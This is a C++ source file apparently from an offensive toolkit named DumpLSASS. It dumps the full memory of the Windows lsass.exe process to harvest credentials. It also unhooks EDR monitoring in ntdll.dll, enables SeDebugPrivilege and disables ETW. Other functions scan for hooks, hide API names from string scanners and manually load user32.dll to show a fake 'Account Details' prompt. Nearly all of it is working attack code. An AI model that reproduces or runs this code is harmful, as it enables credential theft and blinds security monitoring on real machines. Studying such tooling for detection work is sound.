// DumpLSASS.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <windows.h>
#include <DbgHelp.h>
#include <TlHelp32.h>
#include "../lib/token.h"
#include "../lib/bypass_av.h"

# pragma comment(lib, "dbghelp.lib")

#define PIPESIZE 1024
HANDLE m_ePipeEnd;
HANDLE m_ePipeStart;
DWORD WINAPI PipeThreadRead(LPVOID szParams);

void dump_lsass()
{
	m_ePipeEnd = CreateEventW(
		NULL, // default security attribute
		TRUE, // manual reset event 
		TRUE, // initial state = signaled 
		NULL);   // unnamed event object 
	m_ePipeStart = CreateEventW(
		NULL, // default security attribute
		TRUE, // manual reset event 
		TRUE, // initial state = signaled 
		NULL);   // unnamed event object 

	if (m_ePipeEnd == NULL || m_ePipeStart == NULL)
	{

		return;
	}

	// Create pipe handles
	HANDLE readPipe, writePipe;
	if (!CreatePipe(&readPipe, &writePipe, NULL, PIPESIZE))
	{
		return;
	}

	DWORD lsassPID = 0;
	HANDLE lsassHandle = NULL;

	// Hide strings
	const wchar_t* lsass_file = L"dump.txt";
	//wchar_t lsass_file[] = { 'd','u','m','p','.','t','x', 't', 0 };
	const wchar_t* lsass_exe = L"lsass.exe";
	//const wchar_t* discord_exe = L"discord.exe";
	//wchar_t lsass_exe[] = { 'l','s','a','s','s','.','e','x','e', 0 };

	// Open a handle to lsass.dmp - this is where the minidump file will be saved to
	HANDLE outFile = CreateFileW(lsass_file, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	// Find lsass PID	
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32W processEntry = {};
	processEntry.dwSize = sizeof(PROCESSENTRY32);
	LPCWSTR processName = L"";

	if (Process32FirstW(snapshot, &processEntry)) {
		while (_wcsicmp(processName, lsass_exe) != 0) {
			Process32NextW(snapshot, &processEntry);
			processName = processEntry.szExeFile;
			lsassPID = processEntry.th32ProcessID;
		}
		std::wcout << "[+] Got lsass.exe PID: " << lsassPID << std::endl;
	}


	lsassHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, lsassPID);
	/*
	char kernel32_str[] = { 'K','e','r','n','e','l','3','2','.','d','l','l', 0};
	HMODULE hKernel32 = LoadLibraryA(kernel32_str);
	printf("module: %x\n", hKernel32);
	typedef HANDLE (*_OpenProcess)(
		DWORD    dwDesiredAccess,
		BOOL     bInherithandle,
		DWORD    dwProcessId
	);
	char openprocess_wstr[] = { 'O','p','e','n','P','r','o','c','e','s','s', 0 };
	_OpenProcess fOpenProcess = (_OpenProcess)GetProcAddress(hKernel32, openprocess_wstr);
	printf("function: %x\n", fOpenProcess);

	// Open handle to lsass.exe process
	lsassHandle = fOpenProcess(PROCESS_ALL_ACCESS, 0, lsassPID);
	*/

	// Write minidump to the file
	MINIDUMP_EXCEPTION_INFORMATION mei;
	mei.ThreadId = GetCurrentThreadId();
	//mei.ExceptionPointers = pExcPtrs;
	mei.ClientPointers = FALSE;
	MINIDUMP_CALLBACK_INFORMATION mci;
	mci.CallbackRoutine = NULL;
	mci.CallbackParam = NULL;

	DWORD  dwThreadId = 0;
	ResetEvent(m_ePipeStart);
	ResetEvent(m_ePipeEnd);
	// Create thread to read from pipe
	HANDLE hThreadRead = CreateThread(
		NULL,              // no security attribute 
		PIPESIZE * 2,      // default stack size 
		PipeThreadRead,     // thread proc
		(LPVOID)readPipe,   // thread parameter 
		0,                // not suspended 
		&dwThreadId);       // returns thread ID 

	BOOL bRet = SetEvent(m_ePipeStart);

	BOOL isDumped = MiniDumpWriteDump(lsassHandle, lsassPID, writePipe, MiniDumpWithFullMemory, NULL, NULL, NULL);
	/*
	char debughelp_str[] = { 'D','b','g','h','e','l','p','.','d','l','l', 0 };
	HMODULE hDbghelp = LoadLibraryA(debughelp_str);
	printf("module: %x\n", hDbghelp);
	typedef BOOL(*_MiniDumpWriteDump)(
		HANDLE,
		DWORD,
		HANDLE,
		MINIDUMP_TYPE,
		PMINIDUMP_EXCEPTION_INFORMATION,
		PMINIDUMP_USER_STREAM_INFORMATION,
		PMINIDUMP_CALLBACK_INFORMATION
		);
	char minidump_wstr[] = { 'M','i','n','i','D','u','m','p','W','r','i','t','e','D','u','m','p', 0};
	_MiniDumpWriteDump fMiniDump = (_MiniDumpWriteDump)GetProcAddress(hDbghelp, minidump_wstr);
	printf("function: %x\n", fMiniDump);
	
	// Create minidump
	BOOL isDumped = fMiniDump(lsassHandle, lsassPID, outFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
	*/

	if (isDumped) {
		std::cout << "YEAH" << std::endl;
	}
	else
	{
		std::cout << "FAIL" << std::endl;
	}

	Sleep(100);
	// Signal end of writing to a pipe
	bRet = SetEvent(m_ePipeEnd);

	CloseHandle(writePipe);
	CloseHandle(readPipe);
}

// Functions, which handles reading from pipe
DWORD WINAPI PipeThreadRead(LPVOID szParams)
{
	HANDLE hPipe = (HANDLE)szParams;
	DWORD sum = 0;
	BYTE* m_pPipeRead = NULL;
	while (1)
	{
		if (WaitForSingleObject(m_ePipeStart, 5000) == WAIT_OBJECT_0)
			break;
	}
	BYTE buf[PIPESIZE];
	DWORD dwRead;

	while (1)
	{
		memset(buf, 0, PIPESIZE);

		if (ReadFile(hPipe, buf, 10, &dwRead, NULL))
		{
			if (m_pPipeRead == NULL)
			{
				m_pPipeRead = (BYTE*)malloc(dwRead);
			}
			else
			{
				m_pPipeRead = (BYTE*)realloc(m_pPipeRead, dwRead + sum);
			}

			memcpy(m_pPipeRead + sum, buf, dwRead);

			sum += dwRead;
		}
		if (WaitForSingleObject(m_ePipeEnd, 0) == WAIT_OBJECT_0)
			break;
	}

	printf("DumpSize: %d\n", sum);

	return 1;
}

void enable_privilege(const char* privilege)
{
	printf("Enabling privilege %s\n", privilege);

	Token* token = getCurrentToken(TOKEN_ADJUST_PRIVILEGES);
	if (token == NULL)
	{
		if (GetLastError() == ERROR_ACCESS_DENIED)
		{
			printf("Unable to get our token: ERROR_ACCESS_DENIED\n");
		}
		else
		{
			printf("Unable to get our token: %d\n", GetLastError());
		}

		return;
	}

	int res = token->enablePrivilege(privilege);
	if (res != 0)
	{
		delete(token);
		printf("Unable to set privilege %s: %d\n", privilege, GetLastError());

		return;
	}

	delete(token);

	printf("Successfully enabled privilege %s\n", privilege);
}

void disable_edr()
{
	Bypass_EDR byp = Bypass_EDR();



	/*
	* Read NTDLL file
	*/
	HANDLE handle = byp.CreateFileW((LPWSTR)L"C:\\Windows\\System32\\ntdll.dll", FILE_GENERIC_READ, FILE_SHARE_READ, FILE_OPEN, NULL);

	if (handle == NULL)
	{
		printf("Failed to open ntdll\n");
		return;
	}

	printf("Successfully opened ntdll\n");

	unsigned int ntdll_size = 0;
	unsigned int ntdll_buffer_size = 1024 * 10;
	char* ntdll_buffer = (char*)malloc(ntdll_buffer_size);

	DWORD size_read;
	while (true)
	{
		NTSTATUS hres = byp.ReadFile(handle, ntdll_buffer+ntdll_size, ntdll_buffer_size-ntdll_size, &size_read);

		if (hres == STATUS_END_OF_FILE)
		{
			ntdll_size += size_read;
			break;
		}
		else if (hres == STATUS_SUCCESS)
		{
			ntdll_size += size_read;

			if (ntdll_size == ntdll_buffer_size)
			{
				// REALLOC
				ntdll_buffer_size += 1024*10;
				ntdll_buffer = (char*)realloc(ntdll_buffer, ntdll_buffer_size);
			}
		}
		else
		{
			printf("Error: %d\n", hres);
			return;
		}
	}

	printf("Done reading NTDLL, size: %d\n", ntdll_size);

	BOOL res = byp.CloseHandle(handle);
	if (res == FALSE)
	{
		printf("Failed to close handle\n");
		return;
	}

	printf("Successfully read ntdll\n");

	int compare = byp.check_dll("ntdll.dll", ntdll_buffer);
	if (compare == 0)
	{
		printf("Ntdll has not been modified\n");
	}
	else if (compare == 1)
	{
		printf("Ntdll has been modified\n");
	}
	else
	{
		printf("Unable to compare\n");
	}

	res = byp.unhook_dll("ntdll.dll", ntdll_buffer);
	if (res == FALSE)
	{
		printf("Failed to unhook ntdll\n");
		return;
	}

	printf("Successfully cleaned up ntdll\n");

	compare = byp.check_dll("ntdll.dll", ntdll_buffer);
	if (compare == 0)
	{
		printf("Ntdll has not been modified\n");
	}
	else if (compare == 1)
	{
		printf("Ntdll has been modified\n");
	}
	else
	{
		printf("Unable to compare\n");
	}

}

void memory_module()
{
	Bypass_EDR byp = Bypass_EDR();

	/*
	* Read User32.dll file
	*/
	HANDLE handle = byp.CreateFileW((LPWSTR)L"C:\\Windows\\System32\\User32.dll", FILE_GENERIC_READ, FILE_SHARE_READ, FILE_OPEN, NULL);

	if (handle == NULL)
	{
		printf("Failed to open User32\n");
		return;
	}

	printf("Successfully opened User32\n");

	unsigned int user32_size = 0;
	unsigned int user32_buffer_size = 1024 * 10;
	char* user32_buffer = (char*)malloc(user32_buffer_size);

	DWORD size_read;
	while (true)
	{
		NTSTATUS hres = byp.ReadFile(handle, user32_buffer + user32_size, user32_buffer_size - user32_size, &size_read);

		if (hres == STATUS_END_OF_FILE)
		{
			user32_size += size_read;
			break;
		}
		else if (hres == STATUS_SUCCESS)
		{
			user32_size += size_read;

			if (user32_size == user32_buffer_size)
			{
				// REALLOC
				user32_buffer_size += 1024 * 10;
				user32_buffer = (char*)realloc(user32_buffer, user32_buffer_size);
			}
		}
		else
		{
			printf("Error: %d\n", hres);
			return;
		}
	}

	printf("Done reading user32.dll, size: %d\n", user32_size);

	bool success = byp.load_dll("user32.dll", user32_buffer, user32_buffer_size);
	if (success)
	{
		printf("Successfully loaded user32\n");
	}
	else
	{
		printf("Failed to load user32: %d\n", GetLastError());
	}

	typedef int(*_MessageBoxA)(
		HWND    hWnd,
		LPCTSTR lpText,
		LPCTSTR lpCaption,
		UINT    uType
		);
	void* func = byp.get_func("user32.dll", "MessageBoxA");
	if (func == 0)
	{
		printf("Failed to get MessageBoxA\n");
	}
	else
	{
		printf("Successfully got MessageBoxA\n");

		_MessageBoxA fMessageBoxA = (_MessageBoxA)func;

		fMessageBoxA(
			NULL,
			"Resource not available\nDo you want to try again?",
			"Account Details",
			MB_ICONWARNING | MB_CANCELTRYCONTINUE | MB_DEFBUTTON2
		);
	}
}

void dll_analysis()
{
	Bypass_EDR byp = Bypass_EDR();

	std::list<DLL> dll_list = byp.list_loaded_dlls();
	for (std::list<DLL>::const_iterator iterator = dll_list.begin(), end = dll_list.end(); iterator != end; ++iterator) {

		printf("%s is loaded at 0x%p.\n", (*iterator).name.c_str(), (*iterator).address);
	}


	HMODULE hDll = LoadLibrary("C:\\windows\\system32\\ntdll.dll");

	std::list<std::string> hook_list = byp.check_hook_jmp(hDll);
	printf("Hooks detection by JMP opcode:\n");
	for (std::list<std::string>::const_iterator iterator = hook_list.begin(), end = hook_list.end(); iterator != end; ++iterator) {

		printf("JMP : %s is hooked\n", (*iterator).c_str());
	}

	std::list<Hook>* hook_list2 = byp.check_hook_diff(L"C:\\windows\\system32\\ntdll.dll", 20);
	if (hook_list2 != NULL)
	{
		printf("Hooks detected by diff:\n");
		for (std::list<Hook>::const_iterator iterator = hook_list2->begin(), end = hook_list2->end(); iterator != end; ++iterator) {

			printf("DIFF: %s is hooked\n", (*iterator).name.c_str());
			printf("Address: 0x%x\n", (*iterator).address);
			printf("Expected:\n%s\n", (*iterator).expected.c_str());
			printf("Got     :\n%s\n", (*iterator).got.c_str());
		}

		delete hook_list2;
	}
	else
	{
		printf("Fail to get hooks\n");
	}


}

int main()
{
    std::cout << "Hello World!\n";

	disable_edr();
	
	enable_privilege("SeDebugPrivilege");

	printf("Disabling ETW\n");
	Bypass_EDR byp = Bypass_EDR();
	byp.disable_etw();
	
	void* amsi_addr = byp.GetModuleFromPEB(L"amsi.dll");
	printf("Amsi DLL: %x\n", amsi_addr);
	

	dll_analysis();

	//dump_lsass();

	//memory_module();

	printf("End DumpLSASS\n");
}
